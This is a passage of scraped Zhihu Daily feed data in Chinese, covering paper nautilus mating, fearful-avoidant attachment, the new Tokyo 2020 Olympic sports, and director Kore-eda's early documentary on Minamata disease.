alt=\"\"></figure><p>船蛸交配示意图，见《海洋中的爱与性》</p>\n<p>这个过程里</p>\n<p>有个细节特别令人感慨</p>\n<p>发射的“子弹”装载了精原细胞</p>\n<p><strong>也承载着雄性的生命</strong></p>\n<p>随着“子弹”的射出</p>\n<p>雄性船蛸的生命也就走到了尽头</p>\n<p>这些“失去价值”的雄性会选择默默游走</p>\n<p>不做任何纠缠</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-c1df11bdcc0199111cf2d57ad9ffff81_720w.jpg?source=8673f162\" alt=\"\"></figure><p>当然，雌性船蛸大概不会感慨</p>\n<p>对它来说，不过就是身上多了几根</p>\n<p>“动来动去的触手”</p>\n<p>早在十九世纪初</p>\n<p>法国生物学家加维耶（Cuvier）</p>\n<p>就见识过雄性船蛸的<strong>“壮举”</strong></p>\n<p>加维耶对自己看到的东西一脸问号：</p>\n<p>扭来扭去的“触手”</p>\n<p>紧紧地附着在船蛸身上</p>\n<p>甚至还不止一只…</p>\n<p>之后，这些东西被当作“寄生虫”</p>\n<p>并拥有了自己的属：“Hectocotylus”</p>\n<p>（化茎腕，这个词现在指头足类动物的阴茎触手）</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-bd185a341d2e9203f2bc1a61ad2832af_720w.jpg?source=8673f162\" alt=\"\"></figure><p>对船蛸奇特的交配方式</p>\n<p>我们依然知之甚少</p>\n<p>不过话说回来</p>\n<p>……</p>\n<p>反正，也没什么参考价值</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-a0446ee51e0fe2861c54036cf678fa74_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>拓展阅读：</strong></p>\n<p>1.《海洋中的爱与性》，玛拉·哈尔特</p>\n<p>2.Guerra, A.; González, A.F.; Rocha, F. (2002). \"Appearance of the common paper nautilus Argonauta argo related to the increase of the sea surface temperature in the north-eastern Atlantic\".</p>\n<p>DOI：<a href=\"http://link.zhihu.com/?target=https%3A//doi.org/10.1017/S0025315402006240\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>doi.org/10.1017/S002531</span><span>5402006240</span><span></span></a></p>\n<p>3. <em>Argonauta_argo，</em></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//animaldiversity.org/accounts/Argonauta_argo/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>animaldiversity.org/acc</span><span>ounts/Argonauta_argo/</span><span></span></a></p>\n<p>4. 分布图见：</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.gbif.org/species/5189614\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://www.</span><span>gbif.org/species/518961</span><span>4</span><span></span></a></p>\n<p><strong>©版权所有，转载请后台留言申请</strong></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/31922512\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738053"},{"title":"面对恐惧型依恋的对象，是否应该做到被他推开时仍然“抱住他”？","date":"2021-07-13 23:07:46","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/6480bb3aca0bd2fa8594685605234066_l.jpg?source=8673f162\"><span>曾旻Zeng Min，</span><span>北师大心理学硕士。提供心理咨询+therapistzm</span>\n<a href=\"https://www.zhihu.com/question/353538349/answer/1992351223\" hidden>阅读原文</a>\n</div>\n<div>\n<p>哎，你先搞懂，什么是「恐惧型依恋」吧。</p>\n<p>看图说话：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-8ce88ecf2f0a264ce7c0924489ac5243_720w.jpg?source=8673f162\" alt=\"\"></figure><p>从社会心理学角度，Bartholomew（1990）的研究发现，依恋现象背后的两个核心心态：<strong>忧虑被弃、回避亲密</strong>。</p>\n<p>那么这两个心态，2X2 矩阵，就把依恋类型划分出四种：</p>\n<blockquote>安全型：既不忧虑被抛弃，也不回避亲密感。<br>痴迷型（焦虑型 / 迷恋型）：十分担心被抛弃，但不回避亲密感（相反，很渴望亲密）。<br>疏离型（回避型 / 冷漠型）：十分回避亲密感，但不担心被抛弃（一开始，就不投入情感，有什么可怕的呢？）<br>恐惧型（未解决型）：既非常担忧被抛弃，又十分回避亲密感。常常在靠近和拉开距离之间摇摆不定。</blockquote>\n<p>恐惧型依恋，是四种依恋类型中，最困难，最痛苦的一类，也常常是伴随有早年创伤经历，或持续经历创伤的一类。</p>\n<p>由于早年的养育中，养育者的情绪不稳定，时而忽视、时而暴力，给婴儿的体验是，亲密不可得（忽视），抛弃随时而来（暴力：例如，情绪暴力，谩骂等；或躯体暴力，殴打）。</p>\n<p>而这种感觉，长期无法得到修复，从而在人内心里植入了混乱的感觉——我既想逃（回避），又想得到爱（忧虑抛弃）。</p>\n<p>从依恋理论出发，Ainsworth 最早从焦虑型依恋中，区分出恐惧型依恋，发现这种婴儿，在人群中的比例不足 5%。往往轻微的依恋创伤，都不至于到恐惧，恐惧往往是极度的伤害所致。</p>\n<p>所以，其实，大多数情况下，别轻言自己是，或者伴侣是恐惧型依恋，或许对方只是焦虑型而已。</p>\n<p>举个例子，Wallin（2012）讲述了一个，自己的临床个案，是「恐惧型依恋（未解决型）」：</p>\n<blockquote>几年前，我遇到一对夫妻，他们表面上来寻求帮助，促进他们的沟通。<br>在第二次会谈中，丈夫和妻子 Sarah 交换了眼神，彼此说了些我完全听不懂的话，中心大意是，好像是看 Sarah 能不能谈……某件事。<br>丈夫卯足了劲点出了主题，妻子接受了提议，讲述了这个故事：<br>原来，在她十几岁的时候，有一天放学回家，她发现母亲已经被父亲谋杀了。<br>听到她讲出这个可怕的创伤性事件，我大吃一惊，几乎无言以对。<br>Sarah 那边神色平静，但明显是很绝望的。她坚持说，这件事及其后果，和今天的她毫不相干。当我鼓励她，如果感觉足够安全的话，对自己的体验开放一些的时候，她的反应非常引人注目。<br>在会谈开始时，她似乎很能参与谈话，而且富有情绪。但现在说到她发现谋杀的事情时，她的语调变得平铺直叙，带着一种阴森可怕的冷漠。她的讲述有好几次都中断了，代之以很长时间的沉默。<br>沉默的时候，她看上去转向内心，关闭了自己，好像正变得迷失起来。<br>在她讨论那灾难性的过去时，她会间歇性地误用“现在进行时态”（英语中出现语法错误）。</blockquote>\n<p>这样的经历，会让一个人，陷入恐惧型的依恋中。她的记忆里，存在一些，完全难以理解、难以加工，难以面对的事情。</p>\n<p>这些事情，会像洪水淹没你的房屋一样，淹没她的情感，让她窒息。</p>\n<p>所以，恐惧型依恋的情绪特点是：淹没性的痛苦，用解离的方式应对。</p>\n<p>解离是啥呢？你简单理解，就是抽离出你的身体，我不是我，我的灵魂飘到天花板上去了，看着下面发生的一切，但这好像与我无关。</p>\n<p>你看过《房思琪的初恋乐园》没？这本小说里，有大量关于“解离”体验的描述。</p>\n<p>这种体验，大部分没有被强暴过，没有被反复的躯体暴力过，没有目睹父亲杀掉母亲的经历，你很难直观地理解它。</p>\n<p>一个接近“解离”体验的方式是，站在原地，伸出左手，右手捏住左耳朵，眼睛看着伸出去的左手，原地旋转 1 分钟，不要停！一直转！</p>\n<p>当这 1 分钟过去后，你会感觉到天旋地转、头晕眼花，自己的魂魄都要飞出去了。</p>\n<p>这种感觉，会在一定程度上，接近「恐惧型依恋」的解离体验。</p>\n<p>而你要知道的是，你可能 3 分钟 5 分钟，就慢慢恢复过来了。而解离体验，是恐惧型依恋的一种日常。你就多少能够知道，这是多么可怕和痛苦的了。</p>\n<p>这种「恐惧」，源自过去的那些创伤性的经历，太过可怕，太过沉重，变成了“一朝被蛇咬十年怕井绳”。</p>\n<p>只要有一点风吹草动，在常人看来，可能是中性的信号，但恐惧型患者的大脑杏仁核，会发出警报：危险！危险！危险！危险！危险！危险！危险！</p>\n<p>于是，他们的肾上腺会激增，而大脑皮层却“死机”了，发不出任何指令。于是，陷入了麻木、僵住，并解离的体验中。</p>\n<p>所以，当「恐惧型依恋」对象，推开你的时候。他的内在世界发生了什么呢？</p>\n<p>用一个大致的推测来看，在那一刻，她感受到，自己的内在灵魂，被你强暴了。</p>\n<p>那么，你觉得，这一刻，你是否要仍然“抱住她”呢？</p>\n<p>我想你应该有答案了。</p>\n<p>任何躯体上的动作，在这一刻，都是：危险！危险！危险！危险！危险！危险！危险！</p>\n<p>如果不能抱住她，你做点什么呢？</p>\n<p>你可以做两件事：</p>\n<p>1，用平静的情绪，和清晰的语言，表达这一刻你的感受。</p>\n<p>2，用你的感受，尝试去理解这一刻，她的感受。</p>\n<p>举个例子：</p>\n<p>你可以冷静的说：看到你的反应，让我感觉有点害怕，也很疑惑。我很担心你（你的感受），不知道在你内心里发生什么了？这一刻，你是既愤怒，又很恐惧吗？（尝试理解她的感觉）。</p>\n<p>这只是一个例子。要义就是：</p>\n<p>1，你不能情绪崩溃，你要保持相对稳定的情绪。</p>\n<p>2，你也不能见诸行动，做出过激的动作。你要做的，就是尝试理解她，贴近她的内心世界。</p>\n<p>3，抛出你的善意，然后等待……</p>\n<p>承受这一刻的风暴，对任何人来说，都不容易。恐惧型依恋的人，会一次次用这种激烈的、莫名其妙的、淹没性的爆发，把你拉进风暴中——就像，她的妈妈（或爸爸），曾经那样把她拉进风暴中一样。</p>\n<p>你这一刻有多么莫名其妙、多么愤怒、多么害怕、多么内心动荡，她曾经就有多么如此。</p>\n<p>她难以用语言跟你说清楚那一切，就只能用这样的行动，把你卷进这场风暴，告诉你，她内心所体验到的。</p>\n<p>你能理解吗？</p>\n<p>以上。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/353538349\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738049"},{"title":"东京奥运会时间表出炉，你最期待哪场比赛？","date":"2021-07-13 23:07:41","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-8d4b733bc79eed4466151f2b22244cb2_l.jpg?source=8673f162\"><span>浩浩耗，</span><span>我有屠龙之术，欲翻流云起舞；我有苍茫之志，欲煎七海成田；</span>\n<a href=\"https://www.zhihu.com/question/471918062/answer/1995170486\" hidden>阅读原文</a>\n</div>\n<div>\n<p>我又来写冷门视角了，<strong>我最期待的，是这届奥运新加入的五个神仙项目</strong>！</p>\n<p>不知道大家是否知道，这届东京奥运会的比赛项目在原有的 28 种项目上，又新加了 5 种比赛项目。那这些都是那些神仙项目？浩哥就按自己感觉的新奇程度来做一个盘点吧。</p>\n<p><strong>Number 5: 运动攀岩</strong></p>\n<p>这个其实很多朋友应该都不陌生，现在很多大型商场里面也有类似的设施，有没概念的朋友，看下图片肯定就会感觉眼熟。虽然这项运动是第一次出现在奥运会的赛场，但该项目目前已获得国际奥委会的临时批准，至少可纳入 2024 年夏季奥林匹克运动会。运动攀岩项目共有两项比赛，分别是男子全能和女子全能。那既然叫全能，那肯定比赛是包含几个项目的，这次就包括速度攀岩，抱石攀岩和难度攀岩三个小项。那总体而言，这项比赛的核心还是比速度，谁用的时间越短，谁就获胜，比如像是速度攀岩，运动员要以 95 度的角度攀登高 15 米的墙壁，选手间的路线都是一样的，就纯比速度。男子比赛的夺冠时间通常在 5 至 6 秒之间，而女子比赛的在 7 秒或 8 秒左右</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-c172a2c7b1b8b6d7032f6b84e940d117_720w.jpg?source=8673f162\" alt=\"\"></figure><p>而抱石攀岩和难度攀岩就要更难一点，虽然终点相同，但选手需要根据自己的特点，再短时间内自己提前设定路线，一个适合自己的路线，往往能起到关键的作用。也正式因为这个原因，为了防止运动员因观看他人比赛而提前了解岩壁从而获得优势，每位攀岩者在自己出场比赛之前都被安排在特定区域休息，保证无法提前观察到岩壁。在比赛开始前，他们只有几分钟时间来观察岩壁和攀爬路线。</p>\n<p><strong>Number 4: 滑板</strong></p>\n<p>是的，你没听错，就是滑板。这项运动始于二十世纪 40 年代美国西海岸。当时的滑板样式是窄木板加小铁轮。经过进一步改良后，塑料取代了金属成为车轮的首选材料。第一款“滚轮冲浪板”亦在市面开始零售，后来这种“滚轮冲浪板”逐渐进化成了我们今天所熟知的滑板。这项运动在年青一代中备受欢迎，80 年代到 90 年代，滑板运动在全球范围内流行起来。自 90 年代末以来，滑板运动已成为街头文化的重要组成部分。</p>\n<p>那么这次奥运会的滑板项目又分为公园赛和街式赛两种，都分男女组，所以一共会有 4 枚金牌产生。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-30976f3a8a9a60f4020705ca752049c4_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这两种赛事的区别主要还是在于场地，</p>\n<p>公园赛的场地，是在一个充满各种曲线、弧面的凹槽的场地中进行。公园赛场地看起来类似几个“大圆盘子”或者几个“大碗”拼凑而成。凹槽底部相对较平，越接近周围侧壁弧面坡度越陡，边缘侧壁最上端已经呈垂直或接近垂直的角度。公园赛最大的看点是运动员加速冲向陡坡之后高高跃起的同时在空中完成复杂技巧展示。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-4439bdf88846b9545f445aaa87b98ee2_720w.jpg?source=8673f162\" alt=\"\"></figure><p>而街式赛的场地是在一条笔直的“街道”举行，场地中包含楼梯、扶手、路边缘、长椅、墙壁和斜坡。每位运动员都需单独完成比赛，利用每个设施完成技巧展示。裁判员要综合考虑技巧难度、起跳高度、速度、原创性、执行力和动作构成等因素，打出综合分。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-4f1d0e54fad2bc7ad9a8708db73d00fb_720w.jpg?source=8673f162\" alt=\"\"></figure><p>其中最有意思的，当属在轨道或路基滑行过程中，运动员经常会使用的一种叫 Ollie（豚跳）的绝招，这是一种运动员不用手而带板腾空的技巧，一般技巧娴熟的滑板老炮呢，通常都会尽量让这一高难度动作看起来很轻松，从而彰显自己的高超实力。</p>\n<p><strong>总之，我觉得这项比赛应该是一项观赏性十足的比赛。</strong></p>\n<p><strong>Number 3: 冲浪</strong></p>\n<p>冲浪大家应该都不陌生，但确实这是该项运动第一次加入到奥运，冲浪运动，一般根据使用的冲浪板的大小和类型进行划分。通常分为长短板，短板大约 6 英尺(1.8 米)长。有一个尖端，可以帮助转弯，操纵起来更快，这样有助于运动员施展更复杂的技巧。而长板的长度在 9 英尺(2.7 米)左右，比短板浮力更大。而这次奥运会，冲浪项目将使用短板，届时将各有男子、女子运动员各 20 名参加不同比赛的争夺。</p>\n<p>有意思的是，这项比赛是真正在海中举行。要知道大海中可没有完全相同的海浪，所以每个海浪的溃散方式都不同，但比赛总是要分个高低的，<strong>那大家是否好奇，这冲浪比赛到底是怎么打分的呢</strong>？</p>\n<p>浩哥刻意去查了下资料，大概总结一下。其实跟跳水类似，每次冲浪的分数由五名评委组成的评审团根据“评判标准”进行打分。每次的分数在 1-10 之间，去掉最高和最低分之后，取剩下 3 个分数的平均值。那每一个选手的比赛时间根据具体的情况，在 20-35 分钟左右，在这个期间，选手可以随意冲浪几次，最后的分数在所有冲浪的分数中，选最高的两次相加。比如选手一共冲了三次浪，得分分别为 1 分，9 分和 9.5 分，那最终的分数还是 9+9.5=18.5 分。</p>\n<p>虽然说，选手在规定时间里没有冲浪次数的限制，但裁判的评判标准是基于表现和难度、动作创新、动作组合、动作种类以及速度、力量、流动这些影响冲浪好坏的关键因素制定而成。所以比起追求冲浪次数或花式动作数量，运动员通常在海浪的选择上非常谨慎，需要选择那些提供最大发挥空间的浪，并以最高质量完成冲浪。</p>\n<p>嗯，应该挺好看，但不知道奥委会有没有考虑内陆国家的心理阴影面积。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-a93d68d667d87bc63f39c535521201d6_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>Number 2: 棒球和垒球</strong></p>\n<p>这两个项目其实不算第一次出现在奥运赛场，其实在 2008 年的北京奥运会就露过面，不过后面几届奥运会都取消了，现在只能说已双双重归奥运会怀抱。其实说起棒球，很多朋友应该也不算陌生，虽然不见得很清楚比赛规则，但全垒打，三振出局这些术语应该还是耳熟能详的。尤其是像浩哥这样的 80 后一代，当年一部《棒球英豪》的动画片，应该也是历历在目。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9c0391a29d9d59e2eeda22457cab914e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>那这次奥运比赛的设置呢，是男子棒球，和女子垒球。<strong>就简单说一下垒球与棒球的区别</strong>，垒球与棒球的不同之处在于赛场更小，投手和击球手之间的距离更短。此外，比赛用球更大、密度更小，球棒长度也更短。所以其实可以说，垒球就是为了照顾到女生运动能力相较男生更弱，而形成的室内版棒球。</p>\n<p><strong>Number 1: XXX</strong></p>\n<p>那既然是压轴介绍，那这最后一项的新增项目那肯定是不得了，那这个项目是什么呢？<strong>当当当当~ 它就是大名鼎鼎的——空手道</strong>！这个怎么说呢，就…..太有地方特色了吧，不愧是东京奥运会，一个柔道还不够，还要再来一个。而且来就来，除了分男女，还要分公斤组别，（女子 55 公斤级、61 公斤级、61 公斤以上无差别；男子 67 公斤级、75 公斤级、75 公斤以上无差别），完了还要来一个被称为型的，类似表演赛的比赛。光这一个项目就要产生 8 枚金牌，浩哥只想说一句，城会玩啊！</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-6d61092c065bbd1c916aa9e6e5455da5_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/471918062\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738039"},{"title":"如何评价日本导演是枝裕和？","date":"2021-07-13 23:07:31","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-20e0262f3e00ee68a66b2987864021b6_l.jpg?source=8673f162\"><span>荣荣</span>\n<a href=\"https://www.zhihu.com/question/21139901/answer/1990315087\" hidden>阅读原文</a>\n</div>\n<div>\n<blockquote>面对现实，能够让自我开放到什么样的程度，乃是指导纪录片时的最大课题。<br> ——是枝裕和</blockquote>\n<p><strong>01 ｜是枝裕和 电影之源</strong></p>\n<p>找遍所有是枝裕和的早期资料，都很少被人提到 1991 年的这部纪录片《可是......抛弃福祉的时代》，而取而代之的有关是枝裕和的早期的纪录片是 1993 年《当电影映照时代：侯孝贤和杨德昌》。</p>\n<p>这就很让人好奇，《可是......抛弃福祉的时代》是拍得不够好？还是被社会因素而隐没了？</p>\n<p><strong>如果说《当电影映照时代：侯孝贤和杨德昌》是促成是枝裕和第一部处女作《幻之光》的红娘，那么《可是......抛弃福祉的时代》就是是枝裕和电影作品的灵魂出处。</strong></p>\n<p>是枝裕和进入社会以后的第一份正式工作是在 TV MAN UION 制作公司拍摄电视纪录片。是枝裕和第一次以导演身份自行策划的 60 分钟节目，就是这部社会题材的《可是......抛弃福祉的时代》。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-ce461aa26d24afa8047ecd78f1418167_720w.jpg?source=8673f162\" alt=\"\"></figure><p>即使是在 20 世纪 90 年代，是枝裕和去向相关部门申请五六十年代日本日本环境污染导致周边民众患水俣病事件，依然遭到了反转性拒绝。这其中隐藏的政府管理“污垢”可想而知。</p>\n<p>正因被堂而皇之地“常规性”采访拒绝，迫使是枝裕和不得不思考该从哪一个方面入手，了解这个被日本政府捂得严严实实的脓疮。</p>\n<p>曾经参与其中的精英官僚环境厅长山内丰德不久前自杀事件，人已死，是枝裕和决定从死者妻子的采访入手，也是成为唯一获取信息的途径。一切都是未知的，然而，这个过程，却打开了是枝裕和独特看待世界的细微人文视角。</p>\n<p>日本工业在第二次世界大战后飞速发展，但由于没有环境保护措施，工业污染和各种公害病泛滥成灾。经济虽然得到发展，但环境破坏和贻害无穷的公害病使日本政府和企业付出了极其昂贵的代价。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-50ecd47489e9c780e0cfdc56e6c65d84_720w.jpg?source=8673f162\" alt=\"\"></figure><p>1956 年日本水俣湾出现了怪病“水俣病”，日后轰动世界。是最早出现的由于工业废水排放污染造成的公害病。症状表现为轻者口齿不清、步履蹒跚、面部痴呆、手足麻痹、感觉障碍、视觉丧失、震颤、手足变形，重者神经失常，或酣睡，或兴奋，身体弯弓高叫，直至死亡。被称为世界八大公害事件之一。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c213d22ffccfcf24a8c8164eb97a23b8_720w.jpg?source=8673f162\" alt=\"\"></figure><p>1956-1968，日本政府查究原因的前期阶段。但却出现了几个令人发指的现象：第一查明原因耗时长，长达 12 年。第二参与机构多，组建、解散、重组研究机构不断更改，走马上任的领导者无以计数，第三是查明原因期间窒素公司水俣工厂的乙醛生产线不但没有停产，而是扩大生产。四是赔偿金额低额，受害者家庭不断上诉、游行、上访，效果甚微。</p>\n<p>水俣病引发的诉讼旷日持久，时至今日依然没完没了。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-e5dd19ae50b2ee2e4cc93375436bc6a0_720w.jpg?source=8673f162\" alt=\"\"></figure><p>是枝裕和采访的官员山内丰德，恰巧是是 1959 年投入公务员工作，1960 几年参与过“水俣病”调查研究组，1990 年精神萎靡留下简单遗书在家中身亡。</p>\n<p>是谁让山内丰德陷入绝境走向死亡？是什么让山内丰德一生的价值戛然而止停止付出？鞠躬尽瘁的公务员在日本社会官僚系统中处于什么样的边缘处境？个人的死亡与“水俣病”社会毒瘤是否有关联？</p>\n<p>一切谜底，都需要有人站出来讲明，然而，最清晰的观察者已亡。我们却意外地从是枝裕和以文艺者观察官员一生的角度，看到了整个事件扑朔迷离的悲痛现实。</p>\n<p>1991 年纪录片采访文字稿件整理成如今这本《云没有答案》，20 年前的文字是是枝裕和电影之路成长的起源，也是日本环境污染典型水俣病的治理又新的一个阶段。</p>\n<p>然而令人痛心的是直至今日，日本决定将超过 120 万吨有毒的废水排入太平洋，让海水来稀释福岛核电站的放射性物质，就是当年水俣病的翻版事件，可以而为之的行为令人发指，背后的胃了经济利益和违反道德底线的日本政府，依旧如故，背弃历史。</p>\n<p>面对邻国恼怒置之不理，西方集体沉默得意为之，唯有日本本国的人民才能从核心内部去捍卫道德吧，毕竟他们是最大获利者，他们中的人民也是最大的受害者。</p>\n<p><strong>02｜家庭</strong></p>\n<p>家庭伦理是是枝裕和擅长表现的主题，与其说擅长，不如说理解人文的最初视角。</p>\n<p>孩子与父母的关系是人类原始情感的起源，一个成年人在社会及生活里呈现的所有细节都呈现着孩子童年家庭参与的原生，那是一个人无法更改的 DNA。</p>\n<p>因为和父亲长期疏离，在是枝裕和的电影里，男性常常是缺席或者脆弱不堪的。而从 1991 年是枝裕和对于山内丰德的人生捕捉中早已露出对此的深入观察。</p>\n<p>出生于 1937 年山内丰德童年母亲出走，父亲参与战争几乎没陪伴他，仅仅通过来信文字交流，就战死征场。这样的家庭，造就了山内丰德从小缺失爱的温暖，极度渴望后的山内丰德步入仕途，把不善于表现爱的沉默留给了家庭，把大爱有的放矢的精力投入到现实福祉政策推动中。</p>\n<p>青少年的山内丰德爱上文学，创作诗与散文，发表在媒体的一角，这是他人生最快乐的时光，无忧无虑地臆想的“夏天的云”去弥补父亲去世未能相见一面的遗憾。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-7362ab62ec962caf0c7364ec2e944f2c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>山内丰德那段时间笔名和作品中多次提到夏天的云，爱“云”是内心意向的表达，他对于缺乏与父亲真实感的接触，始终抱以遗憾，借以用“云”的无法触及被动观摩、浩瀚无际，表达思念和变幻莫测的不确定性。</p>\n<p>1953 年 26 岁的山内丰德创作了“梦话”中，用他与云的一场对话表达绝望和挫败，孤独和沉默，云是山内丰德迷茫青春的表达，也是是枝裕和整理这篇纪实文学命名为《云没有回答》，对山内丰德的一种回应。</p>\n<p>热爱文学的山内丰德，那段时间在大学宿舍橘子箱子上夜以继日的创作，小说、诗歌、评论，作品都积极参加刚刚兴起的作品评奖活动。“五月祭”那一次他投了三篇稿件，全部落选，而那一年的小说冠军是大江健三郎，从此大江健三郎进入日本文坛。</p>\n<p>东边不亮西边亮，1959 年山内丰德高级公务员考试第二名的优秀成绩，从此进入仕途，这是他人生的另一段开始，也是他悼念青春、悼念纯粹的文艺、悼念对父亲无所顾忌的思念、悼念文艺懵懂的山内丰德，从此挚爱的文学擦肩而过的苦笑。</p>\n<p>因为和父亲长期疏离，在是枝裕和的电影里，男性常常是缺席或者脆弱不堪的。《第三度嫌疑人》里的父亲形象如此，《如父如子》中的父亲也是，他们都不知所措。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-ce7629f653dcb2bbfce04d202b8bbef8_720w.jpg?source=8673f162\" alt=\"\"></figure><p>与之对应的是那个更不知所措的孩子，《无人知晓》里的明，还是《海街日记》里的小姐妹们，他们都具备超越年龄的成熟心理和生活经验，即便是在整体故事明媚的《奇迹》里，弟弟龙之介也说出了“<strong>比起家庭，我还是选择了世界</strong>”这样大人式的宣言，这些年龄和状态上的错位，让是枝裕和电影里的孩子格外惹人怜爱。</p>\n<p>1991 年与山内丰德的事迹交汇的是枝裕和，27 岁的是枝裕和就对父与子，家庭与孩子，孩子至成年所经历的成长撕裂就早早的嵌入在灵魂里。</p>\n<p>这样的代际连接视角，加以生长年代的重大影响，无论是是纪实性文学还是电影作品，还是纪录片，都是一种扩展式的探索，任何事件的本质都是由无数个因素相互牵制，而人参与其中，不得不透视到人心形成的那部分隐秘的角落。</p>\n<p><strong>03｜死亡</strong></p>\n<blockquote>“我对死亡本身并不感兴趣，但我关心失去挚爱的生者如何面对遗留的状况。不管是在纪录片还是剧情片中，我最大的主题都是展现人们如何度过‘后丧失的暴力’时期。”<br> ——是枝裕和</blockquote>\n<p>《无人知晓》里，小妹妹的意外死亡并没有被放大和细致展现，《小偷家族》里奶奶的死亡甚至是悄无声息的，枝裕和放弃的是，死亡作为一种结果而存在。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-13ed645ec938770905e84a33bca87488_720w.jpg?source=8673f162\" alt=\"\"></figure><p>大哥明如何面对妹妹的死如何转化悲痛，信代和详太房间角落里挖坑埋葬奶奶这种行为的善与恶，世人的评判与真心的对峙，这才是是枝裕和带给大众的重点反思。</p>\n<p>处女作《幻之光》是枝裕和就靠近了“死亡”，女主角由美子的丈夫自杀，在丈夫去世后的漫长岁月里，由美子不断尝试走出阴影，继续生活。而这个故事的背景是不是与山内丰德妻子的访谈有影响，我们不得而知。</p>\n<p>1991 年是枝裕和面采访山内丰德的妻子知子时，显然妻子奉献了所有丈夫资料，以及所有的言语追忆，甚至于眉宇之间，都深深的溶入到是枝裕和日后对于死亡的态度中。</p>\n<p>纵观日本历史“物哀”文化，如血液流淌在日本人思想中，无数的文学作品带着这份血液让世界人大开眼界，死亡在日本是极其普通的话题，自杀也是从幕府时代盛极一时的信仰，然而死亡的意义却无人问津。</p>\n<p>是枝裕和曾这样表达过：</p>\n<blockquote>在追问意义之前，首先必须有快乐地活过的实感。必须与家人、朋友以及周围的自然产生各种联系，有强烈地想活下去的欲望。要以这些为前提谈论人生的意义。</blockquote>\n<p>死亡和人生是相关联的，除了死者以外的人追问其死者死亡的意义，想必只有挖掘他的一生，重新评估其人生价值，细枝末节才可做判断。</p>\n<p>是枝裕和对于大量媒体和政府官员对于山内丰德自杀消息的评论是愤愤不平的，简单而果断、甚至让其背锅，陈述与事实相反，去匆忙定义山内丰德。</p>\n<p>人们默默地开始用“死者沉默定律”，死人是无法发出声音，于是他们的经历就被忽略了，你只能听到幸存者的声音，这些幸存者滔滔不绝地向人介绍他们是如何成为幸存者的，于是人们就相信了他们的话，以为这样做真的就能活下来，但实际上，那些死掉的人，所做的事情，跟幸存者是一样的，甚至更多。</p>\n<p>是枝裕和《云没有答案》不断重新编辑再版的原因就在此，替死者发声，替死者去做呼吁“公共性”的社会问题，替死者去完成日本环境污染及福祉政策相关的人文呼吁。</p>\n<p>从文艺青年到官僚自杀，可以想像的有一万种可能，然而沉浸在是枝裕和的文字，细读想山内丰德的人生，突然想起鲁迅的话：</p>\n<blockquote>革命是痛苦，其中也必然混有污秽和血，决不是如诗人所想象的那般有趣，那般完美；革命尤其是现实的故事，需要各种卑贱的，麻烦的工作，决不如诗人想象的那般浪漫；革命当然有破坏，然而更需要建设，破坏是痛快的，但建设却是麻烦的事。</blockquote>\n<p>山内丰德的人生是日本社会问题最大的讽刺。</p>\n<p><strong>04｜ 反问</strong></p>\n<p>一定有人会质疑：山内丰德自杀宁可自杀，也不愿意继续抗衡现实，宁可留下几个抱歉和感谢的字，也不愿意用遗书去揭发社会的黑暗，是精神的勇士还是现实的懦夫？</p>\n<p>是枝裕和并没有给与具体的解释。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d01984ebf3841beb07b59ddf66261d17_720w.jpg?source=8673f162\" alt=\"\"></figure><p>纪录片导演经历给是枝裕和带来的职业训练：深入社会的调查、采访和拍摄让他习惯从社会新闻中寻找伦理人文，不一概而论，不非黑即白的言辞激烈判定事件。</p>\n<p>处女作《幻之光》和第二部作品《下一站，天国》无论从素材积累还是拍摄手法上，都借助了纪录片的工作方法。</p>\n<p>从《云没有答案》的字里行间，我们能看到枝裕和对细节的关注，他也许并不像一个好的记者可以高效而一针见血地做好采访，但我们无法否认他是一个极好的反问者。</p>\n<p>而且，他能把整体思考细节，可参考的信息整理平铺在读者面前，然后让读者自己来判断和反思，到底是哪里出了问题？我们个体该做哪些回应？</p>\n<p>山内丰德自杀事件，是枝裕和没有给出自杀原因，他展示的是山内丰德 53 年来的一生，为这个社会奋斗的足迹，可衡量的每一处人生价值，陪伴他 20 